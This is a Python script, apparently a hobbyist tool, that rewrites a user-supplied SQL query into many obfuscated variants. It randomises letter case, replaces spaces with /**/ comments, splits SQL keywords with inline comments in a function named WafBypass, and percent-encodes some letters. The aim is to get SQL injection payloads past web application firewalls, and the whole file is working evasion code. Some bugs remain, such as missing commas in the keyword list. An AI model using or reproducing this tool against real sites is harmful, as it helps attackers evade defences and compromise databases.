import random
from string import ascii_letters
import re

sqlstring= " \
SELECT capital FROM world WHERE name = 'France'"
casesensitive=["world"]
finalstring=""

def tolowwercase(string):
    return string.lower()

def replaceSPACE(string):


    return string.replace(" ","/**/")
def randomisechar(string):
    newstring=""
    for c in string:
        if c in ascii_letters:
            choice =random.choice([1,2])
            if choice==1:
                newstring+=c.lower()
            else:
                newstring+=c.upper()
        else:
            newstring+=c
    return newstring


def findCaseSensitiveAndReplaceIt(string,casesensitive):
    for word in casesensitive:
        if word in string.lower():
            resault =re.compile(re.escape(word), re.IGNORECASE)
            return resault.sub(word,string)

listOfSQLCommand=["select","union","where","update",
                  "delete","INSERT","INTO","VALUES",
                  "CREATE","DATABASE","ALTER","TABLE"
                  "INDEX","DROP","and","from"
                   "","","",""
                  ] # places for additional commande that  i forgot them ;)

def WafBypass(string):
    for word in listOfSQLCommand:
        if word == "":
            continue
        if word in string.lower():
            #  find  all that match

            wordmatched=re.findall(word, string, flags=re.IGNORECASE)
            for i in range(len(wordmatched)):
                wordmatched=re.search(word, string, flags=re.IGNORECASE)
                RandomPlace = random.randint(1, len(word)-1)# "hi!" >>> ["h","i","!"] >> "h/**/i!" or "hi/**/!" !neeed to make it also output it as "h/**/i/**/!"
                listofchr = [char for char in wordmatched[0]]

                newword = ""
                for i, c in enumerate(listofchr):
                    if i == RandomPlace:
                        newword += "/**/"
                    newword += c

                resault = re.compile(re.escape(word.lower()), re.IGNORECASE)
                string=resault.sub(newword, string,1)
    return string


def unicodeencoding(string):
    newstring = ""

    for c in string:
        if c in ascii_letters:
            rand = random.choice([1, 2, 3, 4, 5]) # less choices more chances
            if rand == 1:
                w = "%X".replace("X", (hex(ord(c))[2:]))
                newstring += w
            else:
                newstring += c
        else:
            newstring += c
    return newstring

def manupulatestring(i,string):
    switcher = {
        0: tolowwercase(string),
        1: replaceSPACE(string),
        2: randomisechar(string),
        3:WafBypass(string),
        4:unicodeencoding(string)
    }
    return switcher.get(i)

def main(sqlstring,casesensitive):

    finalstring=manupulatestring(0,sqlstring)

    finalstring=manupulatestring(1,finalstring)
    finalstring=manupulatestring(2,finalstring)
    finalstring = manupulatestring(3, finalstring)

    # make sure it's a list
    if type(casesensitive)==type(""):
        casesensitive=casesensitive.split(",")
        finalstring=findCaseSensitiveAndReplaceIt(finalstring,casesensitive)
    else:
        finalstring=findCaseSensitiveAndReplaceIt(finalstring,casesensitive)
    finalstring = manupulatestring(4, finalstring)

    print(finalstring)

#  lowercase everything
if __name__ == '__main__':
    string = input("please write sql query here : ")
    casesen = input("please write any case sensitive words here \n"
                    "separate them by a comma: ")

    rangenum = input("how many output you want?:")

    for _ in range(int(rangenum)):
        main(string,casesen)
